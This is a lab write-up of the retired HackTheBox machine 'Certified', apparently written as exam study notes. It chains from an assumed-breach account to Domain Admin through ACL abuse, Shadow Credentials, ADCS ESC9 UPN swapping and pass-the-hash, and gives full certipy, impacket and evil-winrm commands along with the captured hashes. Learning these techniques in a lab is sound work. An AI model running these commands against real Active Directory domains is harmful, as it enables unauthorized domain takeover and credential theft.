# CERTIFIED - Medium

**Date Started:** June 10, 2026
**Date Completed:** June 10, 2026
**Difficulty:** Medium
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, ACL Chaining, Shadow Credentials, ADCS ESC9, BloodHound, PKINIT
**Status:** COMPLETE

---

## Summary / Attack Chain

First ADCS box and first box under the two-pass workflow (techniques taught before attempt, then driven blind). Five-hop ACL chain from low-priv domain creds to Domain Admin — each hop uses a different abuse technique, and the final two hops leverage certificate services.

```
judith.mader (assumed breach) → BloodHound → WriteOwner on Management group
  → owneredit.py: take ownership of Management
    → dacledit.py: grant WriteMembers on Management
      → net rpc: add judith to Management
        → GenericWrite on management_svc → certipy shadow auto → management_svc hash
          → GenericAll on ca_operator → certipy shadow auto → ca_operator hash
            → ESC9: change ca_operator UPN to Administrator → request cert → revert UPN → auth → Administrator hash
              → Pass-the-Hash → DA
```

**New techniques vs Cascade:** ACL chaining (WriteOwner → DACL edit → group add), Shadow Credentials (msDS-KeyCredentialLink + PKINIT), ADCS ESC9 (CT_FLAG_NO_SECURITY_EXTENSION + weak binding enforcement → UPN swap).

---

## Phase 1 — Enumeration

```bash
nmap -p- -Pn --min-rate 1000 -T4 <TARGET> -oN certified_all_ports.txt
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -Pn -sC -sV <TARGET> -oN certified_services.txt
```

**Findings / reads:**
- **DC fingerprint** (53/88/389/636/3268/3269/445) — Domain Controller.
- **Domain: `certified.htb`**, Host: `DC01`.
- **Port 5985 (WinRM)** — open, evil-winrm available with valid creds + group membership.
- **ADCS** — Certificate Services running (identified via BloodHound later).

```bash
echo "<TARGET> certified.htb DC01.certified.htb DC01" | sudo tee -a /etc/hosts
```

**Assumed breach:** `judith.mader : judith09` — valid domain credentials provided as starting point.

---

## Phase 2 — BloodHound Collection + ACL Analysis

```bash
bloodhound-ce-python -d certified.htb -u judith.mader -p 'judith09' -ns <TARGET> -c All --zip
```

Ingested into BloodHound CE. Mapped the full ACL chain:

```
judith.mader --[WriteOwner]--> Management (group)
Management --[GenericWrite]--> management_svc
management_svc --[GenericAll]--> ca_operator
ca_operator --[ESC9]--> Administrator
```

Five hops, each requiring a different abuse primitive. This is the kind of chain BloodHound exists to find — no single edge is DA, but the full path is.

---

## Phase 3 — ACL Chain: WriteOwner → Group Membership

### Step 1: Take ownership of Management group
```bash
owneredit.py -action write -new-owner judith.mader -target Management certified.htb/judith.mader:'judith09' -dc-ip <TARGET>
```

WriteOwner lets you change the owner of an object. The owner can then modify the DACL (permissions) on that object. Two-step process: take ownership first, then edit permissions.

### Step 2: Grant WriteMembers permission
```bash
dacledit.py -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:'judith09' -dc-ip <TARGET>
```

Now judith can add members to the Management group.

### Step 3: Add judith to Management
```bash
net rpc group addmem "Management" "judith.mader" -U certified.htb/judith.mader%'judith09' -S <TARGET>
```

judith is now a member of Management, inheriting GenericWrite on management_svc.

> **Lesson:** WriteOwner looks like one permission but it's actually three steps: take ownership → edit DACL → use the new permission. Each step requires a separate tool (owneredit.py → dacledit.py → net rpc). Missing any step = "access denied" on the next.

---

## Phase 4 — Shadow Credentials: management_svc → ca_operator

### Shadow Credentials concept
GenericWrite (or GenericAll) on a user lets you write to their `msDS-KeyCredentialLink` attribute. Plant an RSA public key there → authenticate via PKINIT with the corresponding private key → extract the NT hash. Silent — doesn't change the user's password or disrupt existing sessions.

### management_svc hash
```bash
sudo systemctl stop systemd-timesyncd && sudo ntpdate <TARGET>
certipy shadow auto -u judith.mader@certified.htb -p 'judith09' -account management_svc -dc-ip <TARGET>
```

**Result:** `management_svc hash: a091c1832bcdd4677c28b5a6a1295584`

### ca_operator hash
management_svc has GenericAll on ca_operator — same technique:
```bash
certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip <TARGET>
```

**Result:** `ca_operator hash: b4b86f45c6018f1b664f70805f45d8f2`

> **Clock skew fix:** Kerberos requires clocks within 5 minutes. `systemd-timesyncd` was reverting `ntpdate` corrections immediately — had to stop the service first, then sync. Without this fix, every certipy operation fails with KRB_AP_ERR_SKEW.

> **Lesson:** `certipy shadow auto` handles the entire flow (generate keypair → write KeyCredentialLink → PKINIT auth → extract hash → cleanup). The `-hashes :NThash` format uses a leading colon for the empty LM hash portion.

---

## Phase 5 — ESC9: ca_operator → Administrator

### ESC9 conditions
Two misconfigurations must both be present:
1. **Certificate template** has `CT_FLAG_NO_SECURITY_EXTENSION` — the CA omits the requester's SID from the issued certificate.
2. **DC setting** `StrongCertificateBindingEnforcement = 1` — when the SID is missing from a cert, the DC falls back to matching by UPN (User Principal Name) instead.

### The attack
Without a SID in the cert, the DC trusts the UPN field for identity. If you can change a user's UPN to "Administrator" before requesting a cert, the cert maps to the real Administrator account.

### Step 1: Change ca_operator's UPN to Administrator
```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip <TARGET>
```

### Step 2: Request certificate as ca_operator (now with UPN = Administrator)
```bash
certipy req -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip <TARGET>
```

**Result:** `administrator.pfx` saved.

### Step 3: Revert ca_operator's UPN
```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip <TARGET>
```

Must revert BEFORE authenticating — otherwise the DC finds ca_operator's UPN still set to "Administrator" and maps the cert back to ca_operator instead of the real Administrator.

### Step 4: Authenticate with the certificate
```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET>
```

**Result:** `Administrator hash: 0d5b49608bbce1751f708748f67e2d34`

> **Lesson:** ESC9 order of operations is critical: change UPN → request cert → revert UPN → authenticate. If you forget to revert before auth, the DC matches the cert to the wrong account. If you forget to change UPN before requesting, the cert is useless for impersonation.

---

## Phase 6 — Pass-the-Hash → DA

NT hash = the credential for NTLM authentication. No cracking needed.

```bash
evil-winrm -i <TARGET> -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

```
*Evil-WinRM* PS> type C:\Users\management_svc\Desktop\user.txt
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
```

> **Note:** evil-winrm `-H` takes only the NT hash (32 hex chars), not the full `LM:NT` format. Using `aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34` may cause auth failures.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(management_svc Desktop — instance-specific)* |
| root.txt | *(Administrator Desktop — instance-specific)* |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Mistakes During Blind Attempt

Documenting errors made during the unaided run — these are the study points:

1. **Forgot to change UPN before requesting cert** — ran `certipy req` as ca_operator without first setting UPN to Administrator. Got a cert that was useless for impersonation.
2. **CA name typo** — typed `certifed-DC01-CA` (missing 'i') instead of `certified-DC01-CA`. Small typo, instant failure.
3. **Forgot to revert UPN before authenticating** — authenticated with the cert while ca_operator's UPN was still "Administrator". DC matched the cert to ca_operator instead of the real Administrator. Had to revert UPN and re-authenticate.
4. **Wrong hash format for evil-winrm** — used full `LM:NT` format instead of just the NT hash for the `-H` flag.
5. **Clock skew** — remembered it was needed but initially forgot to stop `systemd-timesyncd` before running `ntpdate`.

Decision-making was correct — every technique choice and tool selection was right. One real gap: forgot to revert ca_operator's UPN before authenticating (order-of-operations, not syntax). Syntax was referenced from chat history during the attempt; on the exam you'll have notes/cheatsheets so that's fine, but the UPN revert ordering needs to be internalized.

---

## Lessons / Exam Relevance

- **ACL chaining is the core AD skill** — this box is five hops. The CPTS exam will have chains like this. BloodHound finds the path; you need to know the abuse primitive for each edge type (WriteOwner, GenericWrite, GenericAll).
- **WriteOwner is three steps, not one** — take ownership (owneredit.py) → edit DACL (dacledit.py) → use new permission. Missing any step = access denied.
- **Shadow Credentials are the silent option** — unlike password changes or Kerberoast, shadow creds don't disrupt existing authentication. Plant a key, authenticate with it, extract the hash. `certipy shadow auto` handles the full lifecycle including cleanup.
- **ESC9 order of operations** — change UPN → request cert → revert UPN → authenticate. The revert must happen before auth, not after. This is the most common mistake.
- **ADCS attacks require clock sync** — Kerberos underlies PKINIT. If your clock is off by more than 5 minutes, every certipy operation fails. Kill `systemd-timesyncd` before syncing with `ntpdate`.
- **Pass-the-Hash needs no cracking** — the NT hash IS the NTLM credential. `evil-winrm -H` takes only the 32-char NT hash, not `LM:NT`.
- **SID vs UPN** — SID is permanent (assigned at creation, never changes). UPN is mutable (username@domain format). ESC9 exploits the gap: when the CA omits the SID from the cert, the DC falls back to trusting the UPN — which you just changed.

## Cleanup / Changes Made

- Modified `msDS-KeyCredentialLink` on management_svc and ca_operator (certipy shadow auto cleans up).
- Temporarily changed ca_operator's UPN to "Administrator" (reverted).
- Took ownership of Management group and modified its DACL.
- Added judith.mader to Management group.

